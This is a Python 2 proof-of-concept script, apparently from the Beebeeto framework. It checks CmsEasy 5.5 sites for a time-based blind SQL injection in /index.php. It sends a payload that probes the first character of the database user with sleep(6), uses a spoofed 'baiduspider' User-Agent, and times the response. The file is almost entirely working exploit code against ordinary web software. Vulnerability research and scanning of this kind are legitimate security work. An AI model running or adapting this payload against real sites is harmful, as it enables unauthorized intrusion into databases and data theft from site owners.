#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2
import datetime

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0116',
            'name': 'CmsEasy 5.5 <=20140718 /index.php SQL注入漏洞 POC',
            'author': 'H4rdy',
            'create_date': '2014-10-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'CmsEasy',
            'vul_version': ['5.5'],
            'type': 'SQL Injection',
            'tag': ['CmsEasy盲注漏洞', 'SQL注入漏洞', '/index.php', 'php'],
            'desc': 'CmsEasy 5.5 <=20140718 /lib/table/stats.php中$_SERVER并没有转义，造成了注入.',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-069343',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = "/index.php/aaa',(select/**/if((select/**/ord(substr(user(),1,1)))=114,sleep(6),0)),1)#"
        verify_url = args['options']['target'] + payload
        user_agent = {'User-Agent':'i am baiduspider'}
        req = urllib2.Request(verify_url, headers=user_agent)
        first_time = datetime.datetime.now()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        last_time = datetime.datetime.now()
        different_time = (last_time-first_time).seconds
        if different_time>=6:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())